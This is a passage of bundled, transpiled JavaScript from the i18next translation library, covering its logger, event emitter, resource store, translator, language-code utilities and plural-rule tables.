                                for (var _len2 = arguments.length, args = new Array(_len2), _key2 = 0; _key2 < _len2; _key2++) args[_key2] = arguments[_key2];
                                return this.forward(args, "warn", "", !0);
                            },
                        },
                        {
                            key: "error",
                            value: function () {
                                for (var _len3 = arguments.length, args = new Array(_len3), _key3 = 0; _key3 < _len3; _key3++) args[_key3] = arguments[_key3];
                                return this.forward(args, "error", "");
                            },
                        },
                        {
                            key: "deprecate",
                            value: function () {
                                for (var _len4 = arguments.length, args = new Array(_len4), _key4 = 0; _key4 < _len4; _key4++) args[_key4] = arguments[_key4];
                                return this.forward(args, "warn", "WARNING DEPRECATED: ", !0);
                            },
                        },
                        {
                            key: "forward",
                            value: function (args, lvl, prefix, debugOnly) {
                                return debugOnly && !this.debug ? null : ("string" == typeof args[0] && (args[0] = "".concat(prefix).concat(this.prefix, " ").concat(args[0])), this.logger[lvl](args));
                            },
                        },
                        {
                            key: "create",
                            value: function (moduleName) {
                                return new Logger(this.logger, objectSpread_objectSpread({}, { prefix: "".concat(this.prefix, ":").concat(moduleName, ":") }, this.options));
                            },
                        },
                    ]),
                    Logger
                );
            })())(),
            i18next_EventEmitter = (function () {
                function EventEmitter() {
                    _classCallCheck(this, EventEmitter), (this.observers = {});
                }
                return (
                    _createClass(EventEmitter, [
                        {
                            key: "on",
                            value: function (events, listener) {
                                var _this = this;
                                return (
                                    events.split(" ").forEach(function (event) {
                                        (_this.observers[event] = _this.observers[event] || []), _this.observers[event].push(listener);
                                    }),
                                    this
                                );
                            },
                        },
                        {
                            key: "off",
                            value: function (event, listener) {
                                this.observers[event] &&
                                    (listener
                                        ? (this.observers[event] = this.observers[event].filter(function (l) {
                                              return l !== listener;
                                          }))
                                        : delete this.observers[event]);
                            },
                        },
                        {
                            key: "emit",
                            value: function (event) {
                                for (var _len = arguments.length, args = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) args[_key - 1] = arguments[_key];
                                if (this.observers[event]) {
                                    var cloned = [].concat(this.observers[event]);
                                    cloned.forEach(function (observer) {
                                        observer.apply(void 0, args);
                                    });
                                }
                                if (this.observers["*"]) {
                                    var _cloned = [].concat(this.observers["*"]);
                                    _cloned.forEach(function (observer) {
                                        observer.apply(observer, [event].concat(args));
                                    });
                                }
                            },
                        },
                    ]),
                    EventEmitter
                );
            })();
        function defer() {
            var res,
                rej,
                promise = new Promise(function (resolve, reject) {
                    (res = resolve), (rej = reject);
                });
            return (promise.resolve = res), (promise.reject = rej), promise;
        }
        function makeString(object) {
            return null == object ? "" : "" + object;
        }
        function i18next_copy(a, s, t) {
            a.forEach(function (m) {
                s[m] && (t[m] = s[m]);
            });
        }
        function getLastOfPath(object, path, Empty) {
            function cleanKey(key) {
                return key && key.indexOf("###") > -1 ? key.replace(/###/g, ".") : key;
            }
            function canNotTraverseDeeper() {
                return !object || "string" == typeof object;
            }
            for (var stack = "string" != typeof path ? [].concat(path) : path.split("."); stack.length > 1; ) {
                if (canNotTraverseDeeper()) return {};
                var key = cleanKey(stack.shift());
                !object[key] && Empty && (object[key] = new Empty()), (object = Object.prototype.hasOwnProperty.call(object, key) ? object[key] : {});
            }
            return canNotTraverseDeeper() ? {} : { obj: object, k: cleanKey(stack.shift()) };
        }
        function setPath(object, path, newValue) {
            var _getLastOfPath = getLastOfPath(object, path, Object);
            _getLastOfPath.obj[_getLastOfPath.k] = newValue;
        }
        function getPath(object, path) {
            var _getLastOfPath3 = getLastOfPath(object, path),
                obj = _getLastOfPath3.obj,
                k = _getLastOfPath3.k;
            if (obj) return obj[k];
        }
        function getPathWithDefaults(data, defaultData, key) {
            var value = getPath(data, key);
            return void 0 !== value ? value : getPath(defaultData, key);
        }
        function deepExtend(target, source, overwrite) {
            for (var prop in source)
                "__proto__" !== prop &&
                    "constructor" !== prop &&
                    (prop in target
                        ? "string" == typeof target[prop] || target[prop] instanceof String || "string" == typeof source[prop] || source[prop] instanceof String
                            ? overwrite && (target[prop] = source[prop])
                            : deepExtend(target[prop], source[prop], overwrite)
                        : (target[prop] = source[prop]));
            return target;
        }
        function regexEscape(str) {
            return str.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&");
        }
        var _entityMap = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;", "/": "&#x2F;" };
        function i18next_escape(data) {
            return "string" == typeof data
                ? data.replace(/[&<>"'\/]/g, function (s) {
                      return _entityMap[s];
                  })
                : data;
        }
        var isIE10 = "undefined" != typeof window && window.navigator && window.navigator.userAgent && window.navigator.userAgent.indexOf("MSIE") > -1,
            i18next_ResourceStore = (function (_EventEmitter) {
                function ResourceStore(data) {
                    var _this,
                        options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : { ns: ["translation"], defaultNS: "translation" };
                    return (
                        _classCallCheck(this, ResourceStore),
                        (_this = _possibleConstructorReturn(this, _getPrototypeOf(ResourceStore).call(this))),
                        isIE10 && i18next_EventEmitter.call(_assertThisInitialized(_this)),
                        (_this.data = data || {}),
                        (_this.options = options),
                        void 0 === _this.options.keySeparator && (_this.options.keySeparator = "."),
                        _this
                    );
                }
                return (
                    _inherits(ResourceStore, _EventEmitter),
                    _createClass(ResourceStore, [
                        {
                            key: "addNamespaces",
                            value: function (ns) {
                                this.options.ns.indexOf(ns) < 0 && this.options.ns.push(ns);
                            },
                        },
                        {
                            key: "removeNamespaces",
                            value: function (ns) {
                                var index = this.options.ns.indexOf(ns);
                                index > -1 && this.options.ns.splice(index, 1);
                            },
                        },
                        {
                            key: "getResource",
                            value: function (lng, ns, key) {
                                var options = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {},
                                    keySeparator = void 0 !== options.keySeparator ? options.keySeparator : this.options.keySeparator,
                                    path = [lng, ns];
                                return (
                                    key && "string" != typeof key && (path = path.concat(key)),
                                    key && "string" == typeof key && (path = path.concat(keySeparator ? key.split(keySeparator) : key)),
                                    lng.indexOf(".") > -1 && (path = lng.split(".")),
                                    getPath(this.data, path)
                                );
                            },
                        },
                        {
                            key: "addResource",
                            value: function (lng, ns, key, value) {
                                var options = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : { silent: !1 },
                                    keySeparator = this.options.keySeparator;
                                void 0 === keySeparator && (keySeparator = ".");
                                var path = [lng, ns];
                                key && (path = path.concat(keySeparator ? key.split(keySeparator) : key)),
                                    lng.indexOf(".") > -1 && ((value = ns), (ns = (path = lng.split("."))[1])),
                                    this.addNamespaces(ns),
                                    setPath(this.data, path, value),
                                    options.silent || this.emit("added", lng, ns, key, value);
                            },
                        },
                        {
                            key: "addResources",
                            value: function (lng, ns, resources) {
                                var options = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : { silent: !1 };
                                for (var m in resources) ("string" != typeof resources[m] && "[object Array]" !== Object.prototype.toString.apply(resources[m])) || this.addResource(lng, ns, m, resources[m], { silent: !0 });
                                options.silent || this.emit("added", lng, ns, resources);
                            },
                        },
                        {
                            key: "addResourceBundle",
                            value: function (lng, ns, resources, deep, overwrite) {
                                var options = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : { silent: !1 },
                                    path = [lng, ns];
                                lng.indexOf(".") > -1 && ((deep = resources), (resources = ns), (ns = (path = lng.split("."))[1])), this.addNamespaces(ns);
                                var pack = getPath(this.data, path) || {};
                                deep ? deepExtend(pack, resources, overwrite) : (pack = objectSpread_objectSpread({}, pack, resources)), setPath(this.data, path, pack), options.silent || this.emit("added", lng, ns, resources);
                            },
                        },
                        {
                            key: "removeResourceBundle",
                            value: function (lng, ns) {
                                this.hasResourceBundle(lng, ns) && delete this.data[lng][ns], this.removeNamespaces(ns), this.emit("removed", lng, ns);
                            },
                        },
                        {
                            key: "hasResourceBundle",
                            value: function (lng, ns) {
                                return void 0 !== this.getResource(lng, ns);
                            },
                        },
                        {
                            key: "getResourceBundle",
                            value: function (lng, ns) {
                                return ns || (ns = this.options.defaultNS), "v1" === this.options.compatibilityAPI ? objectSpread_objectSpread({}, {}, this.getResource(lng, ns)) : this.getResource(lng, ns);
                            },
                        },
                        {
                            key: "getDataByLanguage",
                            value: function (lng) {
                                return this.data[lng];
                            },
                        },
                        {
                            key: "toJSON",
                            value: function () {
                                return this.data;
                            },
                        },
                    ]),
                    ResourceStore
                );
            })(i18next_EventEmitter),
            postProcessor = {
                processors: {},
                addPostProcessor: function (module) {
                    this.processors[module.name] = module;
                },
                handle: function (processors, value, key, options, translator) {
                    var _this = this;
                    return (
                        processors.forEach(function (processor) {
                            _this.processors[processor] && (value = _this.processors[processor].process(value, key, options, translator));
                        }),
                        value
                    );
                },
            },
            checkedLoadedFor = {},
            i18next_Translator = (function (_EventEmitter) {
                function Translator(services) {
                    var _this,
                        options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return (
                        _classCallCheck(this, Translator),
                        (_this = _possibleConstructorReturn(this, _getPrototypeOf(Translator).call(this))),
                        isIE10 && i18next_EventEmitter.call(_assertThisInitialized(_this)),
                        i18next_copy(["resourceStore", "languageUtils", "pluralResolver", "interpolator", "backendConnector", "i18nFormat", "utils"], services, _assertThisInitialized(_this)),
                        (_this.options = options),
                        void 0 === _this.options.keySeparator && (_this.options.keySeparator = "."),
                        (_this.logger = baseLogger.create("translator")),
                        _this
                    );
                }
                return (
                    _inherits(Translator, _EventEmitter),
                    _createClass(
                        Translator,
                        [
                            {
                                key: "changeLanguage",
                                value: function (lng) {
                                    lng && (this.language = lng);
                                },
                            },
                            {
                                key: "exists",
                                value: function (key) {
                                    var options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : { interpolation: {} },
                                        resolved = this.resolve(key, options);
                                    return resolved && void 0 !== resolved.res;
                                },
                            },
                            {
                                key: "extractFromKey",
                                value: function (key, options) {
                                    var nsSeparator = void 0 !== options.nsSeparator ? options.nsSeparator : this.options.nsSeparator;
                                    void 0 === nsSeparator && (nsSeparator = ":");
                                    var keySeparator = void 0 !== options.keySeparator ? options.keySeparator : this.options.keySeparator,
                                        namespaces = options.ns || this.options.defaultNS;
                                    if (nsSeparator && key.indexOf(nsSeparator) > -1) {
                                        var m = key.match(this.interpolator.nestingRegexp);
                                        if (m && m.length > 0) return { key: key, namespaces: namespaces };
                                        var parts = key.split(nsSeparator);
                                        (nsSeparator !== keySeparator || (nsSeparator === keySeparator && this.options.ns.indexOf(parts[0]) > -1)) && (namespaces = parts.shift()), (key = parts.join(keySeparator));
                                    }
                                    return "string" == typeof namespaces && (namespaces = [namespaces]), { key: key, namespaces: namespaces };
                                },
                            },
                            {
                                key: "translate",
                                value: function (keys, options, lastKey) {
                                    var _this2 = this;
                                    if (("object" !== _typeof(options) && this.options.overloadTranslationOptionHandler && (options = this.options.overloadTranslationOptionHandler(arguments)), options || (options = {}), null == keys))
                                        return "";
                                    Array.isArray(keys) || (keys = [String(keys)]);
                                    var keySeparator = void 0 !== options.keySeparator ? options.keySeparator : this.options.keySeparator,
                                        _this$extractFromKey = this.extractFromKey(keys[keys.length - 1], options),
                                        key = _this$extractFromKey.key,
                                        namespaces = _this$extractFromKey.namespaces,
                                        namespace = namespaces[namespaces.length - 1],
                                        lng = options.lng || this.language,
                                        appendNamespaceToCIMode = options.appendNamespaceToCIMode || this.options.appendNamespaceToCIMode;
                                    if (lng && "cimode" === lng.toLowerCase()) {
                                        if (appendNamespaceToCIMode) {
                                            var nsSeparator = options.nsSeparator || this.options.nsSeparator;
                                            return namespace + nsSeparator + key;
                                        }
                                        return key;
                                    }
                                    var resolved = this.resolve(keys, options),
                                        res = resolved && resolved.res,
                                        resUsedKey = (resolved && resolved.usedKey) || key,
                                        resExactUsedKey = (resolved && resolved.exactUsedKey) || key,
                                        resType = Object.prototype.toString.apply(res),
                                        noObject = ["[object Number]", "[object Function]", "[object RegExp]"],
                                        joinArrays = void 0 !== options.joinArrays ? options.joinArrays : this.options.joinArrays,
                                        handleAsObjectInI18nFormat = !this.i18nFormat || this.i18nFormat.handleAsObject,
                                        handleAsObject = "string" != typeof res && "boolean" != typeof res && "number" != typeof res;
                                    if (handleAsObjectInI18nFormat && res && handleAsObject && noObject.indexOf(resType) < 0 && ("string" != typeof joinArrays || "[object Array]" !== resType)) {
                                        if (!options.returnObjects && !this.options.returnObjects)
                                            return (
                                                this.logger.warn("accessing an object - but returnObjects options is not enabled!"),
                                                this.options.returnedObjectHandler ? this.options.returnedObjectHandler(resUsedKey, res, options) : "key '".concat(key, " (").concat(this.language, ")' returned an object instead of string.")
                                            );
                                        if (keySeparator) {
                                            var resTypeIsArray = "[object Array]" === resType,
                                                copy = resTypeIsArray ? [] : {},
                                                newKeyToUse = resTypeIsArray ? resExactUsedKey : resUsedKey;
                                            for (var m in res)
                                                if (Object.prototype.hasOwnProperty.call(res, m)) {
                                                    var deepKey = "".concat(newKeyToUse).concat(keySeparator).concat(m);
                                                    (copy[m] = this.translate(deepKey, objectSpread_objectSpread({}, options, { joinArrays: !1, ns: namespaces }))), copy[m] === deepKey && (copy[m] = res[m]);
                                                }
                                            res = copy;
                                        }
                                    } else if (handleAsObjectInI18nFormat && "string" == typeof joinArrays && "[object Array]" === resType) (res = res.join(joinArrays)) && (res = this.extendTranslation(res, keys, options, lastKey));
                                    else {
                                        var usedDefault = !1,
                                            usedKey = !1,
                                            needsPluralHandling = void 0 !== options.count && "string" != typeof options.count,
                                            hasDefaultValue = Translator.hasDefaultValue(options),
                                            defaultValueSuffix = needsPluralHandling ? this.pluralResolver.getSuffix(lng, options.count) : "",
                                            defaultValue = options["defaultValue".concat(defaultValueSuffix)] || options.defaultValue;
                                        !this.isValidLookup(res) && hasDefaultValue && ((usedDefault = !0), (res = defaultValue)), this.isValidLookup(res) || ((usedKey = !0), (res = key));
                                        var updateMissing = hasDefaultValue && defaultValue !== res && this.options.updateMissing;
                                        if (usedKey || usedDefault || updateMissing) {
                                            if ((this.logger.log(updateMissing ? "updateKey" : "missingKey", lng, namespace, key, updateMissing ? defaultValue : res), keySeparator)) {
                                                var fk = this.resolve(key, objectSpread_objectSpread({}, options, { keySeparator: !1 }));
                                                fk &&
                                                    fk.res &&
                                                    this.logger.warn(
                                                        "Seems the loaded translations were in flat JSON format instead of nested. Either set keySeparator: false on init or make sure your translations are published in nested format."
                                                    );
                                            }
                                            var lngs = [],
                                                fallbackLngs = this.languageUtils.getFallbackCodes(this.options.fallbackLng, options.lng || this.language);
                                            if ("fallback" === this.options.saveMissingTo && fallbackLngs && fallbackLngs[0]) for (var i = 0; i < fallbackLngs.length; i++) lngs.push(fallbackLngs[i]);
                                            else "all" === this.options.saveMissingTo ? (lngs = this.languageUtils.toResolveHierarchy(options.lng || this.language)) : lngs.push(options.lng || this.language);
                                            var send = function (l, k, fallbackValue) {
                                                _this2.options.missingKeyHandler
                                                    ? _this2.options.missingKeyHandler(l, namespace, k, updateMissing ? fallbackValue : res, updateMissing, options)
                                                    : _this2.backendConnector && _this2.backendConnector.saveMissing && _this2.backendConnector.saveMissing(l, namespace, k, updateMissing ? fallbackValue : res, updateMissing, options),
                                                    _this2.emit("missingKey", l, namespace, k, res);
                                            };
                                            this.options.saveMissing &&
                                                (this.options.saveMissingPlurals && needsPluralHandling
                                                    ? lngs.forEach(function (language) {
                                                          _this2.pluralResolver.getSuffixes(language).forEach(function (suffix) {
                                                              send([language], key + suffix, options["defaultValue".concat(suffix)] || defaultValue);
                                                          });
                                                      })
                                                    : send(lngs, key, defaultValue));
                                        }
                                        (res = this.extendTranslation(res, keys, options, resolved, lastKey)),
                                            usedKey && res === key && this.options.appendNamespaceToMissingKey && (res = "".concat(namespace, ":").concat(key)),
                                            usedKey && this.options.parseMissingKeyHandler && (res = this.options.parseMissingKeyHandler(res));
                                    }
                                    return res;
                                },
                            },
                            {
                                key: "extendTranslation",
                                value: function (res, key, options, resolved, lastKey) {
                                    var _this3 = this;
                                    if (this.i18nFormat && this.i18nFormat.parse) res = this.i18nFormat.parse(res, options, resolved.usedLng, resolved.usedNS, resolved.usedKey, { resolved: resolved });
                                    else if (!options.skipInterpolation) {
                                        options.interpolation && this.interpolator.init(objectSpread_objectSpread({}, options, { interpolation: objectSpread_objectSpread({}, this.options.interpolation, options.interpolation) }));
                                        var nestBef,
                                            skipOnVariables = (options.interpolation && options.interpolation.skipOnVariables) || this.options.interpolation.skipOnVariables;
                                        if (skipOnVariables) {
                                            var nb = res.match(this.interpolator.nestingRegexp);
                                            nestBef = nb && nb.length;
                                        }
                                        var data = options.replace && "string" != typeof options.replace ? options.replace : options;
                                        if (
                                            (this.options.interpolation.defaultVariables && (data = objectSpread_objectSpread({}, this.options.interpolation.defaultVariables, data)),
                                            (res = this.interpolator.interpolate(res, data, options.lng || this.language, options)),
                                            skipOnVariables)
                                        ) {
                                            var na = res.match(this.interpolator.nestingRegexp);
                                            nestBef < (na && na.length) && (options.nest = !1);
                                        }
                                        !1 !== options.nest &&
                                            (res = this.interpolator.nest(
                                                res,
                                                function () {
                                                    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                                                    return lastKey && lastKey[0] === args[0] && !options.context
                                                        ? (_this3.logger.warn("It seems you are nesting recursively key: ".concat(args[0], " in key: ").concat(key[0])), null)
                                                        : _this3.translate.apply(_this3, args.concat([key]));
                                                },
                                                options
                                            )),
                                            options.interpolation && this.interpolator.reset();
                                    }
                                    var postProcess = options.postProcess || this.options.postProcess,
                                        postProcessorNames = "string" == typeof postProcess ? [postProcess] : postProcess;
                                    return (
                                        null != res &&
                                            postProcessorNames &&
                                            postProcessorNames.length &&
                                            !1 !== options.applyPostProcessor &&
                                            (res = postProcessor.handle(postProcessorNames, res, key, this.options && this.options.postProcessPassResolved ? objectSpread_objectSpread({ i18nResolved: resolved }, options) : options, this)),
                                        res
                                    );
                                },
                            },
                            {
                                key: "resolve",
                                value: function (keys) {
                                    var found,
                                        usedKey,
                                        exactUsedKey,
                                        usedLng,
                                        usedNS,
                                        _this4 = this,
                                        options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                                    return (
                                        "string" == typeof keys && (keys = [keys]),
                                        keys.forEach(function (k) {
                                            if (!_this4.isValidLookup(found)) {
                                                var extracted = _this4.extractFromKey(k, options),
                                                    key = extracted.key;
                                                usedKey = key;
                                                var namespaces = extracted.namespaces;
                                                _this4.options.fallbackNS && (namespaces = namespaces.concat(_this4.options.fallbackNS));
                                                var needsPluralHandling = void 0 !== options.count && "string" != typeof options.count,
                                                    needsContextHandling = void 0 !== options.context && "string" == typeof options.context && "" !== options.context,
                                                    codes = options.lngs ? options.lngs : _this4.languageUtils.toResolveHierarchy(options.lng || _this4.language, options.fallbackLng);
                                                namespaces.forEach(function (ns) {
                                                    _this4.isValidLookup(found) ||
                                                        ((usedNS = ns),
                                                        !checkedLoadedFor["".concat(codes[0], "-").concat(ns)] &&
                                                            _this4.utils &&
                                                            _this4.utils.hasLoadedNamespace &&
                                                            !_this4.utils.hasLoadedNamespace(usedNS) &&
                                                            ((checkedLoadedFor["".concat(codes[0], "-").concat(ns)] = !0),
                                                            _this4.logger.warn(
                                                                'key "'.concat(usedKey, '" for languages "').concat(codes.join(", "), '" won\'t get resolved as namespace "').concat(usedNS, '" was not yet loaded'),
                                                                "This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!"
                                                            )),
                                                        codes.forEach(function (code) {
                                                            if (!_this4.isValidLookup(found)) {
                                                                usedLng = code;
                                                                var pluralSuffix,
                                                                    possibleKey,
                                                                    finalKey = key,
                                                                    finalKeys = [finalKey];
                                                                if (_this4.i18nFormat && _this4.i18nFormat.addLookupKeys) _this4.i18nFormat.addLookupKeys(finalKeys, key, code, ns, options);
                                                                else
                                                                    needsPluralHandling && (pluralSuffix = _this4.pluralResolver.getSuffix(code, options.count)),
                                                                        needsPluralHandling && needsContextHandling && finalKeys.push(finalKey + pluralSuffix),
                                                                        needsContextHandling && finalKeys.push((finalKey += "".concat(_this4.options.contextSeparator).concat(options.context))),
                                                                        needsPluralHandling && finalKeys.push((finalKey += pluralSuffix));
                                                                for (; (possibleKey = finalKeys.pop()); ) _this4.isValidLookup(found) || ((exactUsedKey = possibleKey), (found = _this4.getResource(code, ns, possibleKey, options)));
                                                            }
                                                        }));
                                                });
                                            }
                                        }),
                                        { res: found, usedKey: usedKey, exactUsedKey: exactUsedKey, usedLng: usedLng, usedNS: usedNS }
                                    );
                                },
                            },
                            {
                                key: "isValidLookup",
                                value: function (res) {
                                    return !(void 0 === res || (!this.options.returnNull && null === res) || (!this.options.returnEmptyString && "" === res));
                                },
                            },
                            {
                                key: "getResource",
                                value: function (code, ns, key) {
                                    var options = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                                    return this.i18nFormat && this.i18nFormat.getResource ? this.i18nFormat.getResource(code, ns, key, options) : this.resourceStore.getResource(code, ns, key, options);
                                },
                            },
                        ],
                        [
                            {
                                key: "hasDefaultValue",
                                value: function (options) {
                                    for (var option in options) if (Object.prototype.hasOwnProperty.call(options, option) && "defaultValue" === option.substring(0, "defaultValue".length) && void 0 !== options[option]) return !0;
                                    return !1;
                                },
                            },
                        ]
                    ),
                    Translator
                );
            })(i18next_EventEmitter);
        function capitalize(string) {
            return string.charAt(0).toUpperCase() + string.slice(1);
        }
        var i18next_LanguageUtil = (function () {
                function LanguageUtil(options) {
                    _classCallCheck(this, LanguageUtil),
                        (this.options = options),
                        (this.whitelist = this.options.supportedLngs || !1),
                        (this.supportedLngs = this.options.supportedLngs || !1),
                        (this.logger = baseLogger.create("languageUtils"));
                }
                return (
                    _createClass(LanguageUtil, [
                        {
                            key: "getScriptPartFromCode",
                            value: function (code) {
                                if (!code || code.indexOf("-") < 0) return null;
                                var p = code.split("-");
                                return 2 === p.length ? null : (p.pop(), "x" === p[p.length - 1].toLowerCase() ? null : this.formatLanguageCode(p.join("-")));
                            },
                        },
                        {
                            key: "getLanguagePartFromCode",
                            value: function (code) {
                                if (!code || code.indexOf("-") < 0) return code;
                                var p = code.split("-");
                                return this.formatLanguageCode(p[0]);
                            },
                        },
                        {
                            key: "formatLanguageCode",
                            value: function (code) {
                                if ("string" == typeof code && code.indexOf("-") > -1) {
                                    var specialCases = ["hans", "hant", "latn", "cyrl", "cans", "mong", "arab"],
                                        p = code.split("-");
                                    return (
                                        this.options.lowerCaseLng
                                            ? (p = p.map(function (part) {
                                                  return part.toLowerCase();
                                              }))
                                            : 2 === p.length
                                            ? ((p[0] = p[0].toLowerCase()), (p[1] = p[1].toUpperCase()), specialCases.indexOf(p[1].toLowerCase()) > -1 && (p[1] = capitalize(p[1].toLowerCase())))
                                            : 3 === p.length &&
                                              ((p[0] = p[0].toLowerCase()),
                                              2 === p[1].length && (p[1] = p[1].toUpperCase()),
                                              "sgn" !== p[0] && 2 === p[2].length && (p[2] = p[2].toUpperCase()),
                                              specialCases.indexOf(p[1].toLowerCase()) > -1 && (p[1] = capitalize(p[1].toLowerCase())),
                                              specialCases.indexOf(p[2].toLowerCase()) > -1 && (p[2] = capitalize(p[2].toLowerCase()))),
                                        p.join("-")
                                    );
                                }
                                return this.options.cleanCode || this.options.lowerCaseLng ? code.toLowerCase() : code;
                            },
                        },
                        {
                            key: "isWhitelisted",
                            value: function (code) {
                                return (
                                    this.logger.deprecate("languageUtils.isWhitelisted", 'function "isWhitelisted" will be renamed to "isSupportedCode" in the next major - please make sure to rename it\'s usage asap.'),
                                    this.isSupportedCode(code)
                                );
                            },
                        },
                        {
                            key: "isSupportedCode",
                            value: function (code) {
                                return (
                                    ("languageOnly" === this.options.load || this.options.nonExplicitSupportedLngs) && (code = this.getLanguagePartFromCode(code)),
                                    !this.supportedLngs || !this.supportedLngs.length || this.supportedLngs.indexOf(code) > -1
                                );
                            },
                        },
                        {
                            key: "getBestMatchFromCodes",
                            value: function (codes) {
                                var found,
                                    _this = this;
                                return codes
                                    ? (codes.forEach(function (code) {
                                          if (!found) {
                                              var cleanedLng = _this.formatLanguageCode(code);
                                              (_this.options.supportedLngs && !_this.isSupportedCode(cleanedLng)) || (found = cleanedLng);
                                          }
                                      }),
                                      !found &&
                                          this.options.supportedLngs &&
                                          codes.forEach(function (code) {
                                              if (!found) {
                                                  var lngOnly = _this.getLanguagePartFromCode(code);
                                                  if (_this.isSupportedCode(lngOnly)) return (found = lngOnly);
                                                  found = _this.options.supportedLngs.find(function (supportedLng) {
                                                      if (0 === supportedLng.indexOf(lngOnly)) return supportedLng;
                                                  });
                                              }
                                          }),
                                      found || (found = this.getFallbackCodes(this.options.fallbackLng)[0]),
                                      found)
                                    : null;
                            },
                        },
                        {
                            key: "getFallbackCodes",
                            value: function (fallbacks, code) {
                                if (!fallbacks) return [];
                                if (("function" == typeof fallbacks && (fallbacks = fallbacks(code)), "string" == typeof fallbacks && (fallbacks = [fallbacks]), "[object Array]" === Object.prototype.toString.apply(fallbacks)))
                                    return fallbacks;
                                if (!code) return fallbacks.default || [];
                                var found = fallbacks[code];
                                return (
                                    found || (found = fallbacks[this.getScriptPartFromCode(code)]),
                                    found || (found = fallbacks[this.formatLanguageCode(code)]),
                                    found || (found = fallbacks[this.getLanguagePartFromCode(code)]),
                                    found || (found = fallbacks.default),
                                    found || []
                                );
                            },
                        },
                        {
                            key: "toResolveHierarchy",
                            value: function (code, fallbackCode) {
                                var _this2 = this,
                                    fallbackCodes = this.getFallbackCodes(fallbackCode || this.options.fallbackLng || [], code),
                                    codes = [],
                                    addCode = function (c) {
                                        c && (_this2.isSupportedCode(c) ? codes.push(c) : _this2.logger.warn("rejecting language code not found in supportedLngs: ".concat(c)));
                                    };
                                return (
                                    "string" == typeof code && code.indexOf("-") > -1
                                        ? ("languageOnly" !== this.options.load && addCode(this.formatLanguageCode(code)),
                                          "languageOnly" !== this.options.load && "currentOnly" !== this.options.load && addCode(this.getScriptPartFromCode(code)),
                                          "currentOnly" !== this.options.load && addCode(this.getLanguagePartFromCode(code)))
                                        : "string" == typeof code && addCode(this.formatLanguageCode(code)),
                                    fallbackCodes.forEach(function (fc) {
                                        codes.indexOf(fc) < 0 && addCode(_this2.formatLanguageCode(fc));
                                    }),
                                    codes
                                );
                            },
                        },
                    ]),
                    LanguageUtil
                );
            })(),
            i18next_sets = [
                { lngs: ["ach", "ak", "am", "arn", "br", "fil", "gun", "ln", "mfe", "mg", "mi", "oc", "pt", "pt-BR", "tg", "tl", "ti", "tr", "uz", "wa"], nr: [1, 2], fc: 1 },
                {
                    lngs: [
                        "af",
                        "an",
                        "ast",
                        "az",
                        "bg",
                        "bn",
                        "ca",
                        "da",
                        "de",
                        "dev",
                        "el",
                        "en",
                        "eo",
                        "es",
                        "et",
                        "eu",
                        "fi",
                        "fo",
                        "fur",
                        "fy",
                        "gl",
                        "gu",
                        "ha",
                        "hi",
                        "hu",
                        "hy",
                        "ia",
                        "it",
                        "kn",
                        "ku",
                        "lb",
                        "mai",
                        "ml",
                        "mn",
                        "mr",
                        "nah",
                        "nap",
                        "nb",
                        "ne",
                        "nl",
                        "nn",
                        "no",
                        "nso",
                        "pa",
                        "pap",
                        "pms",
                        "ps",
                        "pt-PT",
                        "rm",
                        "sco",
                        "se",
                        "si",
                        "so",
                        "son",
                        "sq",
                        "sv",
                        "sw",
                        "ta",
                        "te",
                        "tk",
                        "ur",
                        "yo",
                    ],
                    nr: [1, 2],
                    fc: 2,
                },
                { lngs: ["ay", "bo", "cgg", "fa", "ht", "id", "ja", "jbo", "ka", "kk", "km", "ko", "ky", "lo", "ms", "sah", "su", "th", "tt", "ug", "vi", "wo", "zh"], nr: [1], fc: 3 },
                { lngs: ["be", "bs", "cnr", "dz", "hr", "ru", "sr", "uk"], nr: [1, 2, 5], fc: 4 },
                { lngs: ["ar"], nr: [0, 1, 2, 3, 11, 100], fc: 5 },
                { lngs: ["cs", "sk"], nr: [1, 2, 5], fc: 6 },
                { lngs: ["csb", "pl"], nr: [1, 2, 5], fc: 7 },
                { lngs: ["cy"], nr: [1, 2, 3, 8], fc: 8 },
                { lngs: ["fr"], nr: [1, 2], fc: 9 },
                { lngs: ["ga"], nr: [1, 2, 3, 7, 11], fc: 10 },
                { lngs: ["gd"], nr: [1, 2, 3, 20], fc: 11 },
                { lngs: ["is"], nr: [1, 2], fc: 12 },
                { lngs: ["jv"], nr: [0, 1], fc: 13 },
                { lngs: ["kw"], nr: [1, 2, 3, 4], fc: 14 },
                { lngs: ["lt"], nr: [1, 2, 10], fc: 15 },
                { lngs: ["lv"], nr: [1, 2, 0], fc: 16 },
                { lngs: ["mk"], nr: [1, 2], fc: 17 },
                { lngs: ["mnk"], nr: [0, 1, 2], fc: 18 },
                { lngs: ["mt"], nr: [1, 2, 11, 20], fc: 19 },
                { lngs: ["or"], nr: [2, 1], fc: 2 },
                { lngs: ["ro"], nr: [1, 2, 20], fc: 20 },
                { lngs: ["sl"], nr: [5, 1, 2, 3], fc: 21 },
                { lngs: ["he", "iw"], nr: [1, 2, 20, 21], fc: 22 },
            ],
            _rulesPluralsTypes = {
                1: function (n) {
                    return Number(n > 1);
                },
                2: function (n) {
                    return Number(1 != n);
                },
                3: function (n) {
                    return 0;
                },
                4: function (n) {
                    return Number(n % 10 == 1 && n % 100 != 11 ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2);
                },
                5: function (n) {
                    return Number(0 == n ? 0 : 1 == n ? 1 : 2 == n ? 2 : n % 100 >= 3 && n % 100 <= 10 ? 3 : n % 100 >= 11 ? 4 : 5);
                },
                6: function (n) {
                    return Number(1 == n ? 0 : n >= 2 && n <= 4 ? 1 : 2);
                },
                7: function (n) {
